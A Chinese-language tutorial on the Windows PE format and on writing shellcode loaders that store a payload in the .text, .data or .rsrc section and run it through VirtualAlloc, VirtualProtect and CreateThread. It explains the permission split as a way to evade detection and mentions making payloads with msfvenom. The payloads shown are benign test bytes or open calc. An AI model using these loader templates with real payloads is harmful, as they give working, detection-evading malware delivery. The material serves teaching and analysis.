0x01 初识PE
=========

`PE(Protable Executable)`是Win32平台的标准可执行**文件格式**

`.exe (executable)`文件是一个独立程序，无需依附其他程序，可以直接加载至内存中

`.dll (Dynamic-link library)`动态链接库，不能独立存在于内存中，只用程序调用dll中的函数时，dll才会以模块的形式加载至指定进程中

生成一个PE文件通常需要两部分：

- 源代码
- 编译器  
    是个程序，因为底层只识别机器语言，用于将高级语言转机器语言

创建exe文件
-------

首先介绍个简单的例子：编写生成exe文件，c**源代码**如下

```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    // 打印字符
    printf("First PE file\n");  
    // 等待输入
    getchar();    
    return 0;
}
```

使用`cl.exe`**编译器**进行编译，编译命令如下

```php
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc implant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

参数浅析：

```php
@ECHO OFF   不输出消息
/nologo     取消显示登录版权标志
/Ox     使用最大优化
/MT     使用 LIBCMT.lib 创建多线程可执行文件
/W0     设置警告等级为0（默认为1）
/GS-        关闭缓冲区安全检查
/DNDEBUG    不生成调试信息
/Tc     指定源文件
/link       传递链接器选项
/OUT        指定输出文件名
/SUBSYSTEM  指定子系统
/MACHINE    指定架构
```

编译完成后执行文件，好吧第一个例子就是这么简单~

![LZIoGQ.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-9681e287969bad488a8afd3aaf9bbf3eabef9845.png)

查看exe文件信息
---------

使用[Process Hacker](https://processhacker.sourceforge.io/)工具研究implant.exe进程基本属性，双击该进程查看详细信息。

General选项卡显示该进程的基本信息，如文件地址、文件类型等

![LZI7xs.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-05f1a175baa346e76db792e7dc6a6115ff54532c.png)

Modules选项卡显示该进程加载至内存中所包含的所有dll文件

Memory选项卡显示了该进程的内存布局

![LZIT2j.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-79dec9e7bb505c03569679d984c8f85f479781cc.png)

更详细的信息将在之后的项目中逐渐分析

创建DLL文件
-------

动态链接库（Dynamic-Link Library, DLL）也是PE格式的二进制文件，存放的是各类程序的函数。下面例子是简单生成dll文件的cpp源代码：

很明显不同的是，DLL文件入口函数为[DllMain](https://blog.css8.cn/post/20212000.html)。当静态链接时，或动态链接时调用LoadLibrary和FreeLibrary都会调用DllMain函数。其次在DLL中，需要指定导出的符号（函数），可以由`__declspec(dllexport)`关键字指定。在C++中，如果导出函数符合C语言的符号修饰规范，则需要在其定义前加上`extern C`，防止C++编译器进行符号修饰。

```CPP
#include <Windows.h>
#pragma comment (lib, "user32.lib")

// DllMain是DLL的标准入口点
// 参数fdwReason指明了系统调用Dll的原因
BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  fdwReason, LPVOID lpReserved) {

    // 不同调用情况执行不同行为
    switch (fdwReason)  {
    case DLL_PROCESS_ATTACH:    // DLL初次映射至内存空间中
    case DLL_PROCESS_DETACH:    // DLL解除映射情况
    case DLL_THREAD_ATTACH: 
    case DLL_THREAD_DETACH: 
        break;
    }
    return TRUE;
}

// 外部函数，可以由进程调用
extern "C" {
    // 定义test函数
__declspec(dllexport) BOOL WINAPI test(void) {
    // 弹出提示窗口
    MessageBox(
        NULL,
        "spider",
        "man",
        MB_OK
    );   
         return TRUE;
    }
}
```

> 除了使用`__declspec`关键字指定导入导出符号之外，还可以使用`.def`文件声明导入导出符号。`.def`文件是链接脚本文件，用于控制链接过程。`.def`文件的使用将在后面的篇章中提及
> 
> [DllMain 入口点 | Microsoft Docs](https://docs.microsoft.com/zh-cn/windows/win32/dlls/dllmain)

通过cl.exe编译出dll文件，编译命令略有不同：

```php
cl.exe /D_USRDLL /D_WINDLL implantDLL.cpp /MT /link /DLL /OUT:first.dll
```

![LZIjaT.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-5440a2933bed7353e429fc5ef1f26ce2ca92de14.png)

查看DLL信息
-------

使用[dumpbin](https://docs.microsoft.com/en-us/cpp/build/reference/dumpbin-command-line?view=msvc-170)命令行工具查看DLL文件基本信息

```php
dumpbin /exports first.dll
```

> /exports：导出dll文件所有信息

![LZIXZV.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-bd21588e00359834f935f5326489726a09cda6c2.png)

由于DLL文件不能独立执行，若要执行一个DLL就需要将其植入到一个进程中。

这里我们可以借助Windows中rundll32程序，调用DLL中的函数。例如要调用刚刚生成的first.dll文件中的test函数，使用如下命令：

```php
rundll32 first.dll,test
```

![LZILq0.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-5ed2561ad6fa78ad5ce388c278646f8f8ae2afc0.png)

通过ProcessHacker工具，可以在rundll32.exe程序的Memory和Modules中找到first.dll文件

![LZIziF.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f6196dc5a3d922a9f2ecff6e4b7e05e5b753d943.png)

双击可以查看first.dll文件详细信息

![LZIvIU.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-bf788671fd6c3d68dfde5a7a549166983d5266b9.png)

PE-bear
-------

[工具地址](https://github.com/hasherezade/pe-bear-releases/releases/tag/0.5.5.3)

除了上述工具外，还可以结合PE-bear工具分析exe文件，进一步熟悉PE结构

选择打开calc.exe文件，位置：`C:\Windows\System32\calc.exe`

![LZoEdK.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-bce812221ec4b8cefef6b444d9ecb913e5776e69.png)

左边一栏显示文件的结构信息，可以很明显的看到头部信息（Headers）和段信息（Sections）

![LZoeiD.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-dbdb8c336045fd6a8ad055da87a6a5e6a7fbc24c.png)

右边则是Header和Sections更详细的信息，例如查看段的头部信息（选择Section Header）

![LZoAZ6.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-c605d72f45fdd1ad6f8703710330235a8e55d4c7.png)

再如Resources，里面包含整个文件的资源信息（图标、版本、清单文件）

![LZoVIO.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-05ae18a4536a330d7d48fe2754db60f486e41e3e.png)

`.reloc`段，包含重定位信息，用于Windows加载器对可执行文件进行地址修正

关于段，主要关注这三个重要的段`.text`、`.data`、`.rsrc`

此外，还可以使用dumpbin工具查看PE文件元数据信息

```php
dumpbin /headers C:\Windows\system32\calc.exe
```

> /headers：显示文件和每个段的头部信息

![LZomJe.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-42b367ba3590ffa10daed8a7518c5ba11bdcb6b0.png)

0x02 Payload存储位置
================

> 这里解释下shellcode和payload的区别，shellcode指的是获取得到shell一段代码，而payload指代就比较广泛，不仅仅包含shellcode，还包含触发其他行为的操作（如打开calc计算机程序），在本系列文章中，可能没有那么精确，就默认shellcode约等于payload，暂时不纠结那么多。

payload载入内存中一般存储于三处位置，`.text`段、`.data`段、`.rsrc`段

Dropper指的是发送载荷给目标机器并执行的装置

.text段存储payload
---------------

在内存中运行payload需要几件事情：开辟内存缓冲区，复制payload到缓冲区，执行缓冲区

### 1 开辟内存缓冲区

Win32API中提供了`VirtualAlloc()`函数[VirtualAlloc | Microsoft Docs](https://docs.microsoft.com/zh-CN/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)，用于动态分配内存，声明如下：

```cpp
LPVOID VirtualAlloc(
    LPVOID lpAddress,           // 区域起始地址
    SIZE_T dwSize,              // 分配区域容量
    DWORD  flAllocationType,    // 分配区域类型
    DWORD  flProtect            // 分配区域权限
);
```

- lpAddress指定分配区域的起始地址，设置为NULL表示由系统决定
- dwSize指定分配区域的容量大小
- flAllocationType指定分配内存的类型，主要是这两个MEM\_COMMIT | MEM\_RESERVE  
    这里要知道[保留和占有内存的含义](https://blog.csdn.net/imJaron/article/details/80157835)。当内存放保留（RESERVE）时，一段连续虚拟地址空间被留出，只是分配了。当内存立马被使用时，需要指定为占用（COMMIT）状态。
- flProtect指定[内存保护措施](https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants#constants)（权限），

本例调用如下：

```cpp
exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

### 2 拷贝payload至新缓冲区

Win32API中提供了`RtlMoveMemory()`函数，[RtlMoveMemory | Microsoft Docs](https://docs.microsoft.com/zh-cn/windows/win32/devnotes/rtlmovememory) 用于将源内存块的内容复制到目标内存块，声明如下：

```cpp
VOID RtlMoveMemory(
    VOID UNALIGNED *Destination,
    VOID UNALIGNED *Source,
    SIZE_T         Length
);
```

- \*Destination：指向源内存地址的指针
- \*Source：指向目标内存地址的指针
- Length：拷贝内容大小

本例调用如下：

```cpp
RtlMoveMemory(exec_mem, payload, payload_len);
```

### 3 修改内存权限

之所以不在初始开辟缓冲区时指定执行权限，主要为了绕过检测，同时具有可读可写可执行权限的缓冲区是十分可疑的，很容易被安全设备检测到。因此可以将其分为两步，先分配，在执行前修改执行权限。

Win32API中提供了`VirtualProtect()`函数[VirtualProtect | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)，用于修改已提交（COMMIT）页区域上的保护措施（权限），声明如下：

```cpp
BOOL VirtualProtect(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
);
```

- lpAddress指定起始地址
- dwSize指定修改内存区域的大小
- flNewProtect指定新的内存保护措施（权限），有[这几种](https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants#constants)
- lpflOldProtect指定一块地址，保存之前的保护措施

本例调用如下：

```cpp
rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
```

### 4 创建线程执行payload

做好之前的准备工作后就可以开始创建线程执行payload了。

Win32API中提供了`CreateThread()`函数[CreateThread | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) ，创建一个线程，并在调用进程的虚拟地址空间内执行，返回一个句柄。声明如下：

```cpp
HANDLE CreateThread(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    __drv_aliasesMem LPVOID lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
);
```

- lpThreadAttributes设置继承属性，设置为NULL表示返回的句柄不能被继承
- dwStackSize指定栈的初始大小，设置为0表示使用默认大小1MB
- lpStartAddress指向将待执行内存的指针
- lpParameter指向要传递给线程的变量的指针，设置为0表示没变量需要传递
- dwCreationFlags控制线程创建，设置为0表示马上创建
- lpThreadId指向接收线程标识符的变量的指针，设置为0表示不返回线程标识符

创建了线程后需要执行，Win32API提供了`WaitForSingleObject()`函数[WaitForSingleObject function (synchapi.h) - Win32 apps | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject) 用于执行线程，声明如下：

```cpp
DWORD WaitForSingleObject(
    HANDLE hHandle,
    DWORD  dwMilliseconds
);
```

- hHandle指定待执行的句柄
- dwMilliseconds指的是时间间隔，过后将执行指定线程

本例调用如下：

```php
th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
WaitForSingleObject(th, -1);
```

### 完整代码

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {

    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // shellcode代码
    unsigned char payload[] = {
        0x90,       // NOP
        0x90,       // NOP
        0xcc,       // INT3
        0xc3        // RET
    };
    unsigned int payload_len = 4;

    // 开辟内存缓冲区，分配可读可写权限
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 打印内存信息，用于调试分析
    printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
    printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

    // 拷贝payload到新缓冲区
    RtlMoveMemory(exec_mem, payload, payload_len);

    // 赋予新缓冲区可执行权限
    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    printf("\nHit me!\n");
    getchar();

    // 上述步骤都OK，执行payload
    if ( rv != 0 ) {
            th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
            WaitForSingleObject(th, -1);
    }

    return 0;
}
```

### 动态分析

这里使用简单的shellcode便于分析进程本身

使用`cl.exe`编译cpp源码

```php
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

执行`implant.exe`，打印出内存地址信息

![LZoGo8.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b891e19210a2ec58bbfda3c87ae9fb5f1df3be1d.png)

启动dbg进行调试，添加调试进程，选择`File-Attach`，找到并选择implant进程。

![LZoYFS.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-feda12ed0ec29587082dac10e0bd59105221f0d2.png)

将implant程序运行起来，按`F9`或者右箭头

![LZotJg.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-888fb1f00eb203e69e825cbcbf6995f7f9a7699c.png)

回到cmd窗口按回车运行下，dbg中程序已暂停，在程序代码窗口显示出了我们编写的shellcode

![LZolLt.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-bc68f13bea71fa51103f42ed5a59abdca6fd8f67.png)

接着程序已经执行完了，我们现在的目标是找到shellcode的地址。选择`Memory Map`窗口，右键查找字符串。

![LZoQsI.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-9816e2c1bff7a1c1d2cbfbe3a0d2b2f162389599.png)

```php
Address            Data
000000B3BF4FF980   90 90 CC C3
000001BA8D520000   90 90 CC C3
00007FF644C3101E   90 90 CC C3
```

同之前打印出的调试信息一齐分析

```php
payload addr         : 0x000000B3BF4FF980
exec_mem addr        : 0x000001BA8D520000
```

首先是第一处地址`0x000000B3BF4FF980`，在`Memory Map`中找到对应地址，查看相应的信息，是一块线程栈区，在`Threads`窗口中也可以看到有一处线程被挂起了。

![LZo3eP.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-de85a5b63aa2d81b9b14c9ef87f15d713a864324.png)

结合源代码，main函数会开辟栈区用于保存其局部变量，因此**第一处地址指向main函数开辟的栈区空间**

第二处地址`0x000001BA8D520000`，其类型为私有内存空间，且初始权限为可读可写（RW），后面变为可读可执行（ER），恰好对应了源代码中的开辟缓冲区及修改执行权限。因此**第二处地址指向新开辟的缓冲区空间**

![LZo8df.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-859aac2b7862c87c7d2a575886b79d31bc4a5ae2.png)

第三处地址`0x00007FF644C3101E`，在Memory Map中很明显的可以看到其对应的是`.text`段，即**第三处地址指向shellcode注入至text段的地址空间**

![LZoMQA.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-ef97e6d63a22d240252be789dd87926da2610c74.png)

跟踪分析三个地址，找到对应信息。

.data段存储payload
---------------

源码大部分与.text段存储payload的类似，有一些不同：payload定义为全局变量，因此它将位于main函数之外

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 变化：payload定义为全局变量
unsigned char payload[] = {
    0x90,       // NOP
    0x90,       // NOP
    0xcc,       // INT3
    0xc3        // RET
};
unsigned int payload_len = 4;

int main(void) {

    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
    printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

    RtlMoveMemory(exec_mem, payload, payload_len);

    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    printf("\nHit me!\n");
    getchar();

    if ( rv != 0 ) {
            th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
            WaitForSingleObject(th, -1);
    }

    return 0;
}
```

`cl.exe`工具编译后执行，在dbg将implant.exe打开，执行起来（和上一部分步骤相同）

搜索shellcode字符，存在两处地址，一处指向上面分析的新开辟的缓冲区，另一处指向data段。

![LZoRSJ.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-8dad7497c590c9105a5d5147adbd7864dd5ba33f.png)

.rsrc段存储payload
---------------

对于存储在.rsrc段的payload，程序运行时需要指定特定的API调用去获取资源信息以及提取出payload并执行，需要以下几个步骤：引入资源文件，提取payload，执行payload。

### 1 引入资源文件

Win32API中提供了`FindResource()`函数[FindResourceA | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-findresourcea)，用于找到指定资源所在位置，返回资源句柄。声明如下：

```cpp
HRSRC FindResourceA(
    HMODULE hModule,
    LPCSTR  lpName,
    LPCSTR  lpType
);
```

- hModule指向模块的句柄，设置为NULL表示该函数将搜索用于创建当前进程的模块。
- lpName资源名称
- lpType资源类型，有[这几种](https://docs.microsoft.com/en-us/windows/win32/menurc/resource-types) ，其中RT\_RCDATA表示应用程序定义的资源（原始数据）

本例调用如下：

```cpp
res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
```

- MAKEINTRESOURCE将一个整数值转换为一种资源类型

### 2 提取出payload

**LoadResource函数**[LoadResource | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource)，返回句柄，用于获取内存中指定资源的第一个字节的指针。

```cpp
HGLOBAL LoadResource(
    HMODULE hModule,
    HRSRC   hResInfo
);
```

- hModule指向模块的句柄，设置为NULL表示该函数将搜索用于创建当前进程的模块。
- hResInfo指向已载入资源的句柄

本例调用如下：

```cpp
resHandle = LoadResource(NULL, res);    // 返回内存中指定资源的句柄
```

**LockResource函数**[LockResource | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource)，返回指针指向内存中的资源，声明如下：

```cpp
LPVOID LockResource(
    HGLOBAL hResData
);
```

本例调用如下：

```cpp
payload = (char *) LockResource(resHandle); // 返回指向payload的指针
```

**SizeofResource函数**[SizeofResource | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource)返回指定资源的大小，声明如下：

```cpp
DWORD SizeofResource(
    HMODULE hModule,
    HRSRC   hResInfo
);
```

- hModule指向模块的句柄，设置为NULL表示该函数将搜索用于创建当前进程的模块。
- hResInfo指向已载入资源的句柄

本例调用如下：

```cpp
payload_len = SizeofResource(NULL, res);    // 返回payloal长度
```

### 3 执行payload

这一部分的代码同.text段中存储payload一致，前面有详细的分析

### 完整代码

这部分代码具有几点不同之处，payload没有直接给出，只作出了声明

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"

int main(void) {

    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    HGLOBAL resHandle = NULL;
    HRSRC res;

    unsigned char * payload;
    unsigned int payload_len;

    // 变化：从资源段中提取payload
    res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    resHandle = LoadResource(NULL, res);
    payload = (char *) LockResource(resHandle);
    payload_len = SizeofResource(NULL, res);

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
    printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

    RtlMoveMemory(exec_mem, payload, payload_len);

    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    printf("\nHit me!\n");
    getchar();

    if ( rv != 0 ) {
            th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
            WaitForSingleObject(th, -1);
    }

    return 0;
}

```

### 编译过程

编译过程也与之前有所不同，需要用到三个工具：rc资源编译器、cvtres资源转换器、cl.exe编译器。

- `rc resources.rc`指令用于从`resources.rc`文件中取出资源。

该文件内容同如下，指定预处理文件resources.h和定义变量FAVICON\_ICO，类型为RCDATA，值为calc.ico

```cpp
// resources.rc
#include "resources.h"

FAVICON_ICO RCDATA calc.ico
```

`resources.h`文件内容如下，定义了变量FAVICON\_ICO，值为100

```php
#define FAVICON_ICO 100
```

calc.ico则是我们生成一个payload文件，可以通过msfvenom工具生成。

- `cvtres /MACHINE:x64 /OUT:resources.o resources.res`指令将res文件转换为objiect文件（用于后续的链接工作）
- `cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc implant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 resources.o`将resources.o文件和源文件链接生成.exe文件

编译命令集合为bat批处理文件：

```php
@ECHO OFF

rc resources.rc
cvtres /MACHINE:x64 /OUT:resources.o resources.res
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc implant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 resources.o
```

### 动态分析

编译并执行，打开dbg调试该程序，分别查看以下两个地址，对应新开辟的缓冲区和.rsrc段

```php
payload addr         : 0x00007FF606652060
exec_mem addr        : 0x00000226BAA80000
```

![LZo6FU.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-ce281d038db990c6603d55c99a922e82f5da6289.png)

在Hex窗口查看shellcode内容，右键`Go to-Expression`或`Ctrl+G`，输入地址

![LZocYF.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-e85a64a0a43f5c87750c9e9cd312526a33755de6.png)

用同样的方法在反汇编窗口查看shellcode，添加断点，run起来

![LZogW4.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6786d6dcac3ec9a035a966e7f8f45333eef9aa81.png)

接着在命令窗口中回车下，启动了cala.exe程序

![LZosoT.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-bb934ed7900d0ce2ba8842371ff0de70ec8e4a3e.png)